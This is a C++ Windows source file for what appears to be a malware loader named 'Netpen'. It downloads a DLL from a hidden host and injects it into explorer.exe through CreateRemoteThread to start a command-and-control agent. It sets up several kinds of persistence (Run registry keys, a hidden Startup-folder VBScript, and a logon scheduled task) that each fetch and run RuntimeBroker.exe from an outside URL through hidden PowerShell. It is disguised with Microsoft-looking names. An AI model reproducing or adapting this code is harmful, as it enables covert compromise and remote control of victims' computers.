#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string>
#include "config.h"

#define NETPEN_REGKEY L"Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
#define NETPEN_TASKNAME L"MicrosoftEdgeUpdateTaskCore"
#define NETPEN_DOWNLOAD_URL L"https://allseeing.netlify.app/a"
#define NETPEN_FILENAME L"RuntimeBroker.exe"

static std::wstring g_supabaseHost;

static void InitConfig() {
    g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
}

static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    bool ok = true;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            DWORD written = 0;
            if (!WriteFile(hFile, buf, downloaded, &written, NULL) || written != downloaded) { ok = false; delete[] buf; break; }
        }
        delete[] buf;
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    if (!ok) { DeleteFileA(outputPath); return false; }
    return true;
}

static DWORD FindExplorerPid() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    DWORD sessionId = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) sessionId = 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"explorer.exe") == 0) {
                DWORD procSess = 0;
                if (ProcessIdToSessionId(pe.th32ProcessID, &procSess) && procSess == sessionId) {
                    pid = pe.th32ProcessID;
                    break;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

static bool RunCmd(const std::wstring& cmd) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    std::wstring mutableCmd = cmd;
    if (!CreateProcessW(NULL, &mutableCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return false;
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

static void InstallPersistence() {
    // Check if already installed
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return;
    }

    // Mark as installed
    if (RegCreateKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"Payload", 0, REG_SZ, (BYTE*)L"1", 4);
        RegCloseKey(hKey);
    }

    std::wstring psCmd = L"powershell -w h -c \"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"";

    // HKCU\Run
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
        RegCloseKey(hKey);
    }

    // Startup folder .vbs
    wchar_t appData[MAX_PATH];
    if (GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH) > 0) {
        std::wstring vbsPath = std::wstring(appData) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + std::wstring(NETPEN_FILENAME) + L".update.vbs";
        std::wstring vbsContent = L"CreateObject(\"WScript.Shell\").Run \"powershell -w h -c \"\"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"\"\", 0, False\r\n";
        HANDLE hFile = CreateFileW(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD w = 0;
            WriteFile(hFile, vbsContent.c_str(), (DWORD)(vbsContent.size() * sizeof(wchar_t)), &w, NULL);
            CloseHandle(hFile);
        }
    }

    // Scheduled Task (ONLOGON)
    std::wstring batDir = L"C:\\ProgramData\\Netpen";
    CreateDirectoryW(batDir.c_str(), NULL);
    std::wstring batFile = batDir + L"\\" + std::wstring(NETPEN_FILENAME) + L".update.bat";
    std::wstring batContent = L"@start /b \"\" " + psCmd + L"\r\n";
    HANDLE hBat = CreateFileW(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hBat != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(hBat, batContent.c_str(), (DWORD)(batContent.size() * sizeof(wchar_t)), &w, NULL);
        CloseHandle(hBat);
    }
    std::wstring taskCmd = L"schtasks /create /tn " + std::wstring(NETPEN_TASKNAME) + L" /tr \"\\\"cmd.exe\\\" /c \\\"" + batFile + L"\\\"\" /sc ONLOGON /delay 0000:30 /rl HIGHEST /f";
    RunCmd(taskCmd);

    // HKLM\Run (if admin)
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    InitConfig();
    InstallPersistence();

    // Check if agent is already running inside explorer.exe
    HANDLE hAgentEvent = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
    if (hAgentEvent) {
        CloseHandle(hAgentEvent);
        return 0;
    }

    // Mutex to prevent concurrent injections
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"NetpenAgentInjection");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);
    std::string dllPath = std::string(tmpDir) + "agent_" + std::to_string(GetTickCount()) + ".dll";

    for (int attempt = 0; attempt < 3; attempt++) {
        if (HttpDownloadToFile(L"/storage/v1/object/public/Netpen/agent.dll", dllPath.c_str())) break;
        if (attempt < 2) Sleep(2000);
        else { DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }
    }

    DWORD pid = FindExplorerPid();
    if (!pid) { DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) { DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }

    int wlen = MultiByteToWideChar(CP_UTF8, 0, dllPath.c_str(), -1, NULL, 0);
    std::wstring dllPathW((size_t)wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, dllPath.c_str(), -1, &dllPathW[0], wlen);

    size_t dllPathBytes = (dllPathW.size() + 1) * sizeof(wchar_t);
    void* remotePath = VirtualAllocEx(hProcess, NULL, dllPathBytes, MEM_COMMIT, PAGE_READWRITE);
    if (!remotePath) { CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remotePath, dllPathW.c_str(), dllPathBytes, &written) || written != dllPathBytes) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC loadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryW, remotePath, 0, NULL);
    if (!hLoadThread) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1;
    }

    DWORD waitResult = WaitForSingleObject(hLoadThread, 10000);
    DWORD loadExitCode = 0;
    GetExitCodeThread(hLoadThread, &loadExitCode);

    if (waitResult == WAIT_TIMEOUT) TerminateThread(hLoadThread, 1);
    CloseHandle(hLoadThread);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);

    if (waitResult != WAIT_OBJECT_0 || loadExitCode == 0) {
        CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1;
    }

    // Find where agent.dll was loaded in the remote process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    ULONGLONG remoteDllBase = 0;
    std::wstring dllBaseNameW = dllPathW;
    size_t slashPos = dllBaseNameW.find_last_of(L"\\/");
    if (slashPos != std::wstring::npos) dllBaseNameW = dllBaseNameW.substr(slashPos + 1);

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me = { sizeof(me) };
        if (Module32FirstW(hSnapshot, &me)) {
            do {
                if (lstrcmpiW(me.szModule, dllBaseNameW.c_str()) == 0) {
                    remoteDllBase = (ULONGLONG)me.modBaseAddr;
                    break;
                }
            } while (Module32NextW(hSnapshot, &me));
        }
        CloseHandle(hSnapshot);
    }

    if (!remoteDllBase) { CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }

    // Load DLL locally to calculate AgentInit RVA
    HMODULE hLocalDll = LoadLibraryW(dllPathW.c_str());
    if (!hLocalDll) { CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }

    FARPROC localExport = GetProcAddress(hLocalDll, "AgentInit");
    if (!localExport) { FreeLibrary(hLocalDll); CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }

    ULONGLONG rva = (ULONGLONG)localExport - (ULONGLONG)hLocalDll;
    FreeLibrary(hLocalDll);

    // Start AgentInit (spawns C2 thread and returns immediately)
    HANDLE hInitThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(remoteDllBase + rva), NULL, 0, NULL);
    if (!hInitThread) { CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }

    WaitForSingleObject(hInitThread, 5000);
    CloseHandle(hInitThread);
    CloseHandle(hProcess);

    DeleteFileA(dllPath.c_str());
    if (hMutex) CloseHandle(hMutex);
    return 0;
}
